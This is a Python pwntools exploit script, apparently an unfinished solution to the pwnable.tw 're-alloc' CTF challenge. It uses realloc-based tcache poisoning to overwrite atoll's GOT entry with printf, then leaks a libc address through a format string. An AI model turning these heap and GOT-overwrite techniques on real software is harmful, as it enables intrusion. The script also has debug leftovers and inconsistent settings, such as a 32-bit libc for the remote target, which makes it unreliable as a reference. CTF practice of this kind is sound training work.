

from pwn import *
import pdb
import sys


def alloc(idx, sz, cont):
  p.sendlineafter('Your choice: ', '1')
  p.sendlineafter('Index:', str(idx))
  p.sendlineafter('Size:', str(sz))
  p.sendlineafter('Data:', cont)

def realloc(idx, sz, cont=None):
  p.sendlineafter('Your choice: ', '2')
  p.sendlineafter('Index:', str(idx))
  p.sendlineafter('Size:', str(sz))
  if cont:
    p.sendlineafter('Data:', cont)

def free(idx):
  p.sendlineafter('Your choice: ', '3')
  p.sendlineafter('Index:', str(idx))

def leak_libc():
  p.sendlineafter('Your choice: ', '1')
  p.sendlineafter('Index:', '%p%p')
  cont = p.recvline().strip()

  addr = int(cont, 16)
  return addr
  

DEBUG = True

p = process('/home/len/pwnable/re-alloc')
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')


if not DEBUG:  
  p = remote('chall.pwnable.tw', 10106)
  elf = ELF('./libc_32.so.6')  
  

context.log_level = 'debug'
atoll_got = 0x404048
printf_plt = 0x401070
libc_offset = None


if __name__ == "__main__":
  pdb.set_trace()

  alloc(0, 0x8, p64(atoll_got))
  realloc(0, 0)  
  realloc(0, 0x18, p64(atoll_got))
  alloc(1, 0x8, p64(atoll_got))

  realloc(0, 0x38, p64(atoll_got))
  free(0)
  realloc(1, 0x38, p64(atoll_got))
  free(1)

  pdb.set_trace()
  alloc(0, 0x8, p64(printf_plt))


  addr = leak_libc()
  print('addr: {:#x}'.format(addr))
  libc_base = p.libc.address
  print('offset: {:#x}'.format(addr - libc_base)) 
  
  p.interactive()